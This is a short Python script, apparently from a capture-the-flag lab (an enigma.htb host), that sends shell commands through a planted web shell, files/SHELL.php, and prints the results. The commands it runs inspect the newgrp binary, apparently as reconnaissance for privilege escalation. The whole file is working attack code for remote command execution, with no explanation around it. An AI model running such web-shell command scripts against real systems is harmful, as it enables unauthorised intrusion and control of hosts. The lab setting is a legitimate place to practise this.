import urllib.request, urllib.parse

cmds = [
    "ls -la /usr/bin/newgrp 2>&1",
    "file /usr/bin/newgrp 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(result[:1000])
    except Exception as e:
        pass
